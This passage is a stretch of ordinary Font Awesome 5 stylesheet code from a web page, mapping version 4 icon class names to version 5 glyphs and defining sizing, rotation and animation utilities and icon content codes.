      .fa.fa-header:before {
        content: "\f1dc";
      }
      .fa.fa-sliders:before {
        content: "\f1de";
      }
      .fa.fa-futbol-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-futbol-o:before {
        content: "\f1e3";
      }
      .fa.fa-soccer-ball-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-soccer-ball-o:before {
        content: "\f1e3";
      }
      .fa.fa-slideshare,
      .fa.fa-twitch,
      .fa.fa-yelp {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-newspaper-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-newspaper-o:before {
        content: "\f1ea";
      }
      .fa.fa-cc-amex,
      .fa.fa-cc-discover,
      .fa.fa-cc-mastercard,
      .fa.fa-cc-paypal,
      .fa.fa-cc-stripe,
      .fa.fa-cc-visa,
      .fa.fa-google-wallet,
      .fa.fa-paypal {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-bell-slash-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-bell-slash-o:before {
        content: "\f1f6";
      }
      .fa.fa-trash:before {
        content: "\f2ed";
      }
      .fa.fa-copyright {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-eyedropper:before {
        content: "\f1fb";
      }
      .fa.fa-area-chart:before {
        content: "\f1fe";
      }
      .fa.fa-pie-chart:before {
        content: "\f200";
      }
      .fa.fa-line-chart:before {
        content: "\f201";
      }
      .fa.fa-angellist,
      .fa.fa-ioxhost,
      .fa.fa-lastfm,
      .fa.fa-lastfm-square {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-cc {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-cc:before {
        content: "\f20a";
      }
      .fa.fa-ils:before,
      .fa.fa-shekel:before,
      .fa.fa-sheqel:before {
        content: "\f20b";
      }
      .fa.fa-meanpath {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-meanpath:before {
        content: "\f2b4";
      }
      .fa.fa-buysellads,
      .fa.fa-connectdevelop,
      .fa.fa-dashcube,
      .fa.fa-forumbee,
      .fa.fa-leanpub,
      .fa.fa-sellsy,
      .fa.fa-shirtsinbulk,
      .fa.fa-simplybuilt,
      .fa.fa-skyatlas {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-diamond {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-diamond:before {
        content: "\f3a5";
      }
      .fa.fa-intersex:before {
        content: "\f224";
      }
      .fa.fa-facebook-official {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-facebook-official:before {
        content: "\f09a";
      }
      .fa.fa-pinterest-p,
      .fa.fa-whatsapp {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-hotel:before {
        content: "\f236";
      }
      .fa.fa-medium,
      .fa.fa-viacoin,
      .fa.fa-y-combinator,
      .fa.fa-yc {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-yc:before {
        content: "\f23b";
      }
      .fa.fa-expeditedssl,
      .fa.fa-opencart,
      .fa.fa-optin-monster {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-battery-4:before,
      .fa.fa-battery:before {
        content: "\f240";
      }
      .fa.fa-battery-3:before {
        content: "\f241";
      }
      .fa.fa-battery-2:before {
        content: "\f242";
      }
      .fa.fa-battery-1:before {
        content: "\f243";
      }
      .fa.fa-battery-0:before {
        content: "\f244";
      }
      .fa.fa-object-group,
      .fa.fa-object-ungroup,
      .fa.fa-sticky-note-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-sticky-note-o:before {
        content: "\f249";
      }
      .fa.fa-cc-diners-club,
      .fa.fa-cc-jcb {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-clone,
      .fa.fa-hourglass-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hourglass-o:before {
        content: "\f254";
      }
      .fa.fa-hourglass-1:before {
        content: "\f251";
      }
      .fa.fa-hourglass-2:before {
        content: "\f252";
      }
      .fa.fa-hourglass-3:before {
        content: "\f253";
      }
      .fa.fa-hand-rock-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-rock-o:before {
        content: "\f255";
      }
      .fa.fa-hand-grab-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-grab-o:before {
        content: "\f255";
      }
      .fa.fa-hand-paper-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-paper-o:before {
        content: "\f256";
      }
      .fa.fa-hand-stop-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-stop-o:before {
        content: "\f256";
      }
      .fa.fa-hand-scissors-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-scissors-o:before {
        content: "\f257";
      }
      .fa.fa-hand-lizard-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-lizard-o:before {
        content: "\f258";
      }
      .fa.fa-hand-spock-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-spock-o:before {
        content: "\f259";
      }
      .fa.fa-hand-pointer-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-pointer-o:before {
        content: "\f25a";
      }
      .fa.fa-hand-peace-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-hand-peace-o:before {
        content: "\f25b";
      }
      .fa.fa-registered {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-chrome,
      .fa.fa-creative-commons,
      .fa.fa-firefox,
      .fa.fa-get-pocket,
      .fa.fa-gg,
      .fa.fa-gg-circle,
      .fa.fa-internet-explorer,
      .fa.fa-odnoklassniki,
      .fa.fa-odnoklassniki-square,
      .fa.fa-opera,
      .fa.fa-safari,
      .fa.fa-wikipedia-w {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-television:before {
        content: "\f26c";
      }
      .fa.fa-500px,
      .fa.fa-amazon,
      .fa.fa-contao {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-calendar-plus-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-calendar-plus-o:before {
        content: "\f271";
      }
      .fa.fa-calendar-minus-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-calendar-minus-o:before {
        content: "\f272";
      }
      .fa.fa-calendar-times-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-calendar-times-o:before {
        content: "\f273";
      }
      .fa.fa-calendar-check-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-calendar-check-o:before {
        content: "\f274";
      }
      .fa.fa-map-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-map-o:before {
        content: "\f279";
      }
      .fa.fa-commenting:before {
        content: "\f4ad";
      }
      .fa.fa-commenting-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-commenting-o:before {
        content: "\f4ad";
      }
      .fa.fa-houzz,
      .fa.fa-vimeo {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-vimeo:before {
        content: "\f27d";
      }
      .fa.fa-black-tie,
      .fa.fa-edge,
      .fa.fa-fonticons,
      .fa.fa-reddit-alien {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-credit-card-alt:before {
        content: "\f09d";
      }
      .fa.fa-codiepie,
      .fa.fa-fort-awesome,
      .fa.fa-mixcloud,
      .fa.fa-modx,
      .fa.fa-product-hunt,
      .fa.fa-scribd,
      .fa.fa-usb {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-pause-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-pause-circle-o:before {
        content: "\f28b";
      }
      .fa.fa-stop-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-stop-circle-o:before {
        content: "\f28d";
      }
      .fa.fa-bluetooth,
      .fa.fa-bluetooth-b,
      .fa.fa-envira,
      .fa.fa-gitlab,
      .fa.fa-wheelchair-alt,
      .fa.fa-wpbeginner,
      .fa.fa-wpforms {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-wheelchair-alt:before {
        content: "\f368";
      }
      .fa.fa-question-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-question-circle-o:before {
        content: "\f059";
      }
      .fa.fa-volume-control-phone:before {
        content: "\f2a0";
      }
      .fa.fa-asl-interpreting:before {
        content: "\f2a3";
      }
      .fa.fa-deafness:before,
      .fa.fa-hard-of-hearing:before {
        content: "\f2a4";
      }
      .fa.fa-glide,
      .fa.fa-glide-g {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-signing:before {
        content: "\f2a7";
      }
      .fa.fa-first-order,
      .fa.fa-google-plus-official,
      .fa.fa-pied-piper,
      .fa.fa-snapchat,
      .fa.fa-snapchat-ghost,
      .fa.fa-snapchat-square,
      .fa.fa-themeisle,
      .fa.fa-viadeo,
      .fa.fa-viadeo-square,
      .fa.fa-yoast {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-google-plus-official:before {
        content: "\f2b3";
      }
      .fa.fa-google-plus-circle {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-google-plus-circle:before {
        content: "\f2b3";
      }
      .fa.fa-fa,
      .fa.fa-font-awesome {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-fa:before {
        content: "\f2b4";
      }
      .fa.fa-handshake-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-handshake-o:before {
        content: "\f2b5";
      }
      .fa.fa-envelope-open-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-envelope-open-o:before {
        content: "\f2b6";
      }
      .fa.fa-linode {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-address-book-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-address-book-o:before {
        content: "\f2b9";
      }
      .fa.fa-vcard:before {
        content: "\f2bb";
      }
      .fa.fa-address-card-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-address-card-o:before {
        content: "\f2bb";
      }
      .fa.fa-vcard-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-vcard-o:before {
        content: "\f2bb";
      }
      .fa.fa-user-circle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-user-circle-o:before {
        content: "\f2bd";
      }
      .fa.fa-user-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-user-o:before {
        content: "\f007";
      }
      .fa.fa-id-badge {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-drivers-license:before {
        content: "\f2c2";
      }
      .fa.fa-id-card-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-id-card-o:before {
        content: "\f2c2";
      }
      .fa.fa-drivers-license-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-drivers-license-o:before {
        content: "\f2c2";
      }
      .fa.fa-free-code-camp,
      .fa.fa-quora,
      .fa.fa-telegram {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-thermometer-4:before,
      .fa.fa-thermometer:before {
        content: "\f2c7";
      }
      .fa.fa-thermometer-3:before {
        content: "\f2c8";
      }
      .fa.fa-thermometer-2:before {
        content: "\f2c9";
      }
      .fa.fa-thermometer-1:before {
        content: "\f2ca";
      }
      .fa.fa-thermometer-0:before {
        content: "\f2cb";
      }
      .fa.fa-bathtub:before,
      .fa.fa-s15:before {
        content: "\f2cd";
      }
      .fa.fa-window-maximize,
      .fa.fa-window-restore {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-times-rectangle:before {
        content: "\f410";
      }
      .fa.fa-window-close-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-window-close-o:before {
        content: "\f410";
      }
      .fa.fa-times-rectangle-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-times-rectangle-o:before {
        content: "\f410";
      }
      .fa.fa-bandcamp,
      .fa.fa-eercast,
      .fa.fa-etsy,
      .fa.fa-grav,
      .fa.fa-imdb,
      .fa.fa-ravelry {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-eercast:before {
        content: "\f2da";
      }
      .fa.fa-snowflake-o {
        font-family: "Font Awesome 5 Free";
        font-weight: 400;
      }
      .fa.fa-snowflake-o:before {
        content: "\f2dc";
      }
      .fa.fa-superpowers,
      .fa.fa-wpexplorer {
        font-family: "Font Awesome 5 Brands";
        font-weight: 400;
      }
      .fa.fa-cab:before {
        content: "\f1ba";
      }
    </style>
    <style media="all" id="fa-main">
      /*! * Font Awesome Free 5.15.4 by @fontawesome - https://fontawesome.com * License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) */
      .fa,
      .fab,
      .fad,
      .fal,
      .far,
      .fas {
          -moz-osx-font-smoothing: grayscale;
          -webkit-font-smoothing: antialiased;
          display: inline-block;
          font-style: normal;
          font-variant: normal;
          text-rendering: auto;
          line-height: 1;
      }
      .fa-lg {
          font-size: 1.33333em;
          line-height: 0.75em;
          vertical-align: -0.0667em;
      }
      .fa-xs {
          font-size: 0.75em;
      }
      .fa-sm {
          font-size: 0.875em;
      }
      .fa-1x {
          font-size: 1em;
      }
      .fa-2x {
          font-size: 2em;
      }
      .fa-3x {
          font-size: 3em;
      }
      .fa-4x {
          font-size: 4em;
      }
      .fa-5x {
          font-size: 5em;
      }
      .fa-6x {
          font-size: 6em;
      }
      .fa-7x {
          font-size: 7em;
      }
      .fa-8x {
          font-size: 8em;
      }
      .fa-9x {
          font-size: 9em;
      }
      .fa-10x {
          font-size: 10em;
      }
      .fa-fw {
          text-align: center;
          width: 1.25em;
      }
      .fa-ul {
          list-style-type: none;
          margin-left: 2.5em;
          padding-left: 0;
      }
      .fa-ul > li {
          position: relative;
      }
      .fa-li {
          left: -2em;
          position: absolute;
          text-align: center;
          width: 2em;
          line-height: inherit;
      }
      .fa-border {
          border: 0.08em solid #eee;
          border-radius: 0.1em;
          padding: 0.2em 0.25em 0.15em;
      }
      .fa-pull-left {
          float: left;
      }
      .fa-pull-right {
          float: right;
      }
      .fa.fa-pull-left,
      .fab.fa-pull-left,
      .fal.fa-pull-left,
      .far.fa-pull-left,
      .fas.fa-pull-left {
          margin-right: 0.3em;
      }
      .fa.fa-pull-right,
      .fab.fa-pull-right,
      .fal.fa-pull-right,
      .far.fa-pull-right,
      .fas.fa-pull-right {
          margin-left: 0.3em;
      }
      .fa-spin {
          -webkit-animation: fa-spin 2s linear infinite;
          animation: fa-spin 2s linear infinite;
      }
      .fa-pulse {
          -webkit-animation: fa-spin 1s steps(8) infinite;
          animation: fa-spin 1s steps(8) infinite;
      }
      @-webkit-keyframes fa-spin {
          0% {
              -webkit-transform: rotate(0deg);
              transform: rotate(0deg);
          }
          to {
              -webkit-transform: rotate(1turn);
              transform: rotate(1turn);
          }
      }
      @keyframes fa-spin {
          0% {
              -webkit-transform: rotate(0deg);
              transform: rotate(0deg);
          }
          to {
              -webkit-transform: rotate(1turn);
              transform: rotate(1turn);
          }
      }
      .fa-rotate-90 {
          -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
          -webkit-transform: rotate(90deg);
          transform: rotate(90deg);
      }
      .fa-rotate-180 {
          -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
          -webkit-transform: rotate(180deg);
          transform: rotate(180deg);
      }
      .fa-rotate-270 {
          -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
          -webkit-transform: rotate(270deg);
          transform: rotate(270deg);
      }
      .fa-flip-horizontal {
          -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
          -webkit-transform: scaleX(-1);
          transform: scaleX(-1);
      }
      .fa-flip-vertical {
          -webkit-transform: scaleY(-1);
          transform: scaleY(-1);
      }
      .fa-flip-both,
      .fa-flip-horizontal.fa-flip-vertical,
      .fa-flip-vertical {
          -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
      }
      .fa-flip-both,
      .fa-flip-horizontal.fa-flip-vertical {
          -webkit-transform: scale(-1);
          transform: scale(-1);
      }
      :root .fa-flip-both,
      :root .fa-flip-horizontal,
      :root .fa-flip-vertical,
      :root .fa-rotate-90,
      :root .fa-rotate-180,
      :root .fa-rotate-270 {
          -webkit-filter: none;
          filter: none;
      }
      .fa-stack {
          display: inline-block;
          height: 2em;
          line-height: 2em;
          position: relative;
          vertical-align: middle;
          width: 2.5em;
      }
      .fa-stack-1x,
      .fa-stack-2x {
          left: 0;
          position: absolute;
          text-align: center;
          width: 100%;
      }
      .fa-stack-1x {
          line-height: inherit;
      }
      .fa-stack-2x {
          font-size: 2em;
      }
      .fa-inverse {
          color: #000;
      }
      .fa-500px:before {
          content: "\f26e";
      }
      .fa-accessible-icon:before {
          content: "\f368";
      }
      .fa-accusoft:before {
          content: "\f369";
      }
      .fa-acquisitions-incorporated:before {
          content: "\f6af";
      }
      .fa-ad:before {
          content: "\f641";
      }
      .fa-address-book:before {
          content: "\f2b9";
      }
      .fa-address-card:before {
          content: "\f2bb";
      }
      .fa-adjust:before {
          content: "\f042";
      }
      .fa-adn:before {
          content: "\f170";
      }
      .fa-adversal:before {
          content: "\f36a";
      }
      .fa-affiliatetheme:before {
          content: "\f36b";
      }
      .fa-air-freshener:before {
          content: "\f5d0";
      }
      .fa-airbnb:before {
          content: "\f834";
      }
      .fa-algolia:before {
          content: "\f36c";
      }
      .fa-align-center:before {
          content: "\f037";
      }
      .fa-align-justify:before {
          content: "\f039";
      }
      .fa-align-left:before {
          content: "\f036";
      }
      .fa-align-right:before {
          content: "\f038";
      }
      .fa-alipay:before {
          content: "\f642";
      }
      .fa-allergies:before {
          content: "\f461";
      }
      .fa-amazon:before {
          content: "\f270";
      }
      .fa-amazon-pay:before {
          content: "\f42c";
      }
      .fa-ambulance:before {
          content: "\f0f9";
      }
      .fa-american-sign-language-interpreting:before {
          content: "\f2a3";
      }
      .fa-amilia:before {
          content: "\f36d";
      }
      .fa-anchor:before {
          content: "\f13d";
      }
      .fa-android:before {
          content: "\f17b";
      }
      .fa-angellist:before {
          content: "\f209";
      }
      .fa-angle-double-down:before {
          content: "\f103";
      }
      .fa-angle-double-left:before {
          content: "\f100";
      }
      .fa-angle-double-right:before {
          content: "\f101";
      }
      .fa-angle-double-up:before {
          content: "\f102";
      }
      .fa-angle-down:before {
          content: "\f107";
      }
      .fa-angle-left:before {
          content: "\f104";
      }
      .fa-angle-right:before {
          content: "\f105";
      }
      .fa-angle-up:before {
          content: "\f106";
      }
      .fa-angry:before {
          content: "\f556";
      }
      .fa-angrycreative:before {
          content: "\f36e";
      }
      .fa-angular:before {
          content: "\f420";
      }
      .fa-ankh:before {
          content: "\f644";
      }
      .fa-app-store:before {
          content: "\f36f";
      }
      .fa-app-store-ios:before {
          content: "\f370";
      }
      .fa-apper:before {
          content: "\f371";
      }
      .fa-apple:before {
          content: "\f179";
      }
      .fa-apple-alt:before {
          content: "\f5d1";
      }
      .fa-apple-pay:before {
          content: "\f415";
      }
      .fa-archive:before {
          content: "\f187";
      }
      .fa-archway:before {
          content: "\f557";
      }
      .fa-arrow-alt-circle-down:before {
          content: "\f358";
      }
      .fa-arrow-alt-circle-left:before {
          content: "\f359";
      }
      .fa-arrow-alt-circle-right:before {
          content: "\f35a";
      }
      .fa-arrow-alt-circle-up:before {
          content: "\f35b";
      }
      .fa-arrow-circle-down:before {
          content: "\f0ab";
      }
      .fa-arrow-circle-left:before {
          content: "\f0a8";
      }
      .fa-arrow-circle-right:before {
          content: "\f0a9";
      }
      .fa-arrow-circle-up:before {
          content: "\f0aa";
      }
      .fa-arrow-down:before {
          content: "\f063";
      }
      .fa-arrow-left:before {
          content: "\f060";
      }
      .fa-arrow-right:before {
          content: "\f061";
      }
      .fa-arrow-up:before {
          content: "\f062";
      }
      .fa-arrows-alt:before {
          content: "\f0b2";
      }
      .fa-arrows-alt-h:before {
          content: "\f337";
      }
      .fa-arrows-alt-v:before {
          content: "\f338";
      }
      .fa-artstation:before {
          content: "\f77a";
      }
      .fa-assistive-listening-systems:before {
          content: "\f2a2";
      }
      .fa-asterisk:before {
          content: "\f069";
      }
      .fa-asymmetrik:before {
          content: "\f372";
      }
      .fa-at:before {
          content: "\f1fa";
      }
      .fa-atlas:before {
          content: "\f558";
      }
      .fa-atlassian:before {
          content: "\f77b";
      }
      .fa-atom:before {
          content: "\f5d2";
      }
      .fa-audible:before {
          content: "\f373";
      }
      .fa-audio-description:before {
          content: "\f29e";
      }
      .fa-autoprefixer:before {
          content: "\f41c";
      }
      .fa-avianex:before {
          content: "\f374";
      }
      .fa-aviato:before {
          content: "\f421";
      }
      .fa-award:before {
          content: "\f559";
      }
      .fa-aws:before {
          content: "\f375";
      }
      .fa-baby:before {
          content: "\f77c";
      }
      .fa-baby-carriage:before {
          content: "\f77d";
      }
      .fa-backspace:before {
          content: "\f55a";
      }
      .fa-backward:before {
          content: "\f04a";
      }
      .fa-bacon:before {
          content: "\f7e5";
      }
      .fa-bacteria:before {
          content: "\e059";
      }
      .fa-bacterium:before {
          content: "\e05a";
      }
      .fa-bahai:before {
          content: "\f666";
      }
      .fa-balance-scale:before {
          content: "\f24e";
      }
      .fa-balance-scale-left:before {
          content: "\f515";
      }
      .fa-balance-scale-right:before {
          content: "\f516";
      }
      .fa-ban:before {
          content: "\f05e";
      }
      .fa-band-aid:before {
          content: "\f462";
      }
      .fa-bandcamp:before {
          content: "\f2d5";
      }
      .fa-barcode:before {
          content: "\f02a";
      }
      .fa-bars:before {
          content: "\f0c9";
      }
      .fa-baseball-ball:before {
          content: "\f433";
      }
      .fa-basketball-ball:before {
          content: "\f434";
      }
      .fa-bath:before {
          content: "\f2cd";
      }
      .fa-battery-empty:before {
          content: "\f244";
      }
      .fa-battery-full:before {
          content: "\f240";
      }
      .fa-battery-half:before {
          content: "\f242";
      }
      .fa-battery-quarter:before {
          content: "\f243";
      }
      .fa-battery-three-quarters:before {
          content: "\f241";
      }
      .fa-battle-net:before {
          content: "\f835";
      }
      .fa-bed:before {
          content: "\f236";
      }
      .fa-beer:before {
          content: "\f0fc";
      }
      .fa-behance:before {
          content: "\f1b4";
      }
      .fa-behance-square:before {
          content: "\f1b5";
      }
      .fa-bell:before {
          content: "\f0f3";
      }
      .fa-bell-slash:before {
          content: "\f1f6";
      }
      .fa-bezier-curve:before {
          content: "\f55b";
      }
      .fa-bible:before {
          content: "\f647";
      }
      .fa-bicycle:before {
          content: "\f206";
      }
      .fa-biking:before {
          content: "\f84a";
      }
      .fa-bimobject:before {
          content: "\f378";
      }
      .fa-binoculars:before {
          content: "\f1e5";
      }
      .fa-biohazard:before {
          content: "\f780";
      }
      .fa-birthday-cake:before {
          content: "\f1fd";
      }
      .fa-bitbucket:before {
          content: "\f171";
      }
      .fa-bitcoin:before {
          content: "\f379";
      }
      .fa-bity:before {
          content: "\f37a";
      }
      .fa-black-tie:before {
          content: "\f27e";
      }
      .fa-blackberry:before {
          content: "\f37b";
      }
      .fa-blender:before {
          content: "\f517";
      }
      .fa-blender-phone:before {
          content: "\f6b6";
      }
      .fa-blind:before {
          content: "\f29d";
      }
      .fa-blog:before {
          content: "\f781";
      }
      .fa-blogger:before {
          content: "\f37c";
      }
      .fa-blogger-b:before {
          content: "\f37d";
      }
      .fa-bluetooth:before {
          content: "\f293";
      }
      .fa-bluetooth-b:before {
          content: "\f294";
      }
      .fa-bold:before {
          content: "\f032";
      }
      .fa-bolt:before {
          content: "\f0e7";
      }
      .fa-bomb:before {
          content: "\f1e2";
      }
      .fa-bone:before {
          content: "\f5d7";
      }
      .fa-bong:before {
          content: "\f55c";
      }
      .fa-book:before {
          content: "\f02d";
      }
      .fa-book-dead:before {
          content: "\f6b7";
      }
      .fa-book-medical:before {
          content: "\f7e6";
      }
      .fa-book-open:before {
          content: "\f518";
      }
      .fa-book-reader:before {
          content: "\f5da";
      }
      .fa-bookmark:before {
          content: "\f02e";
      }
      .fa-bootstrap:before {
          content: "\f836";
      }
      .fa-border-all:before {
          content: "\f84c";
      }
      .fa-border-none:before {
          content: "\f850";
      }
      .fa-border-style:before {
          content: "\f853";
      }
      .fa-bowling-ball:before {
          content: "\f436";
      }
      .fa-box:before {
          content: "\f466";
      }
      .fa-box-open:before {
          content: "\f49e";
      }
      .fa-box-tissue:before {
          content: "\e05b";
      }
      .fa-boxes:before {
          content: "\f468";
      }
      .fa-braille:before {
          content: "\f2a1";
      }
      .fa-brain:before {
          content: "\f5dc";
      }
      .fa-bread-slice:before {
          content: "\f7ec";
      }
      .fa-briefcase:before {
          content: "\f0b1";
      }
      .fa-briefcase-medical:before {
          content: "\f469";
      }
      .fa-broadcast-tower:before {
          content: "\f519";
      }
      .fa-broom:before {
          content: "\f51a";
      }
      .fa-brush:before {
          content: "\f55d";
      }
      .fa-btc:before {
          content: "\f15a";
      }
      .fa-buffer:before {
          content: "\f837";
      }
      .fa-bug:before {
          content: "\f188";
      }
      .fa-building:before {
          content: "\f1ad";
      }
      .fa-bullhorn:before {
          content: "\f0a1";
      }
      .fa-bullseye:before {
          content: "\f140";
      }
      .fa-burn:before {
          content: "\f46a";
      }
      .fa-buromobelexperte:before {
          content: "\f37f";
      }
      .fa-bus:before {
          content: "\f207";
      }
      .fa-bus-alt:before {
          content: "\f55e";
      }
      .fa-business-time:before {
          content: "\f64a";
      }
      .fa-buy-n-large:before {
          content: "\f8a6";
      }
      .fa-buysellads:before {
          content: "\f20d";
      }
      .fa-calculator:before {
          content: "\f1ec";
      }
      .fa-calendar:before {
          content: "\f133";
      }
      .fa-calendar-alt:before {
          content: "\f073";
      }
      .fa-calendar-check:before {
          content: "\f274";
      }
      .fa-calendar-day:before {
          content: "\f783";
      }
      .fa-calendar-minus:before {
          content: "\f272";
      }
      .fa-calendar-plus:before {
          content: "\f271";
      }
      .fa-calendar-times:before {
          content: "\f273";
      }
      .fa-calendar-week:before {
          content: "\f784";
      }
      .fa-camera:before {
          content: "\f030";
      }
      .fa-camera-retro:before {
          content: "\f083";
      }
      .fa-campground:before {
          content: "\f6bb";
      }
      .fa-canadian-maple-leaf:before {
          content: "\f785";
      }
      .fa-candy-cane:before {
          content: "\f786";
      }
      .fa-cannabis:before {
          content: "\f55f";
      }
      .fa-capsules:before {
          content: "\f46b";
      }
      .fa-car:before {
          content: "\f1b9";
      }
      .fa-car-alt:before {
          content: "\f5de";
      }
      .fa-car-battery:before {
          content: "\f5df";
      }
      .fa-car-crash:before {
          content: "\f5e1";
      }
      .fa-car-side:before {
          content: "\f5e4";
      }
      .fa-caravan:before {
          content: "\f8ff";
      }
      .fa-caret-down:before {
          content: "\f0d7";
      }
      .fa-caret-left:before {
          content: "\f0d9";
      }
      .fa-caret-right:before {
          content: "\f0da";
      }
      .fa-caret-square-down:before {
          content: "\f150";
      }
      .fa-caret-square-left:before {
          content: "\f191";
      }
      .fa-caret-square-right:before {
          content: "\f152";
      }
      .fa-caret-square-up:before {
          content: "\f151";
      }
      .fa-caret-up:before {
          content: "\f0d8";
      }
      .fa-carrot:before {
          content: "\f787";
      }
      .fa-cart-arrow-down:before {
          content: "\f218";
      }
      .fa-cart-plus:before {
          content: "\f217";
      }
      .fa-cash-register:before {
          content: "\f788";
      }
      .fa-cat:before {
          content: "\f6be";
      }
      .fa-cc-amazon-pay:before {
          content: "\f42d";
      }
      .fa-cc-amex:before {
          content: "\f1f3";
      }
      .fa-cc-apple-pay:before {
          content: "\f416";
      }
      .fa-cc-diners-club:before {
          content: "\f24c";
      }
      .fa-cc-discover:before {
          content: "\f1f2";
      }
      .fa-cc-jcb:before {
          content: "\f24b";
      }
      .fa-cc-mastercard:before {
          content: "\f1f1";
      }
      .fa-cc-paypal:before {
          content: "\f1f4";
      }
      .fa-cc-stripe:before {
          content: "\f1f5";
      }
      .fa-cc-visa:before {
          content: "\f1f0";
      }
      .fa-centercode:before {
          content: "\f380";
      }
      .fa-centos:before {
          content: "\f789";
      }
      .fa-certificate:before {
          content: "\f0a3";
      }
      .fa-chair:before {
          content: "\f6c0";
      }
      .fa-chalkboard:before {
          content: "\f51b";
      }
      .fa-chalkboard-teacher:before {
          content: "\f51c";
      }
      .fa-charging-station:before {
          content: "\f5e7";
      }
      .fa-chart-area:before {
          content: "\f1fe";
      }
      .fa-chart-bar:before {
          content: "\f080";
      }
      .fa-chart-line:before {
          content: "\f201";
      }
      .fa-chart-pie:before {
          content: "\f200";
      }
      .fa-check:before {
          content: "\f00c";
      }
      .fa-check-circle:before {
          content: "\f058";
      }
      .fa-check-double:before {
          content: "\f560";
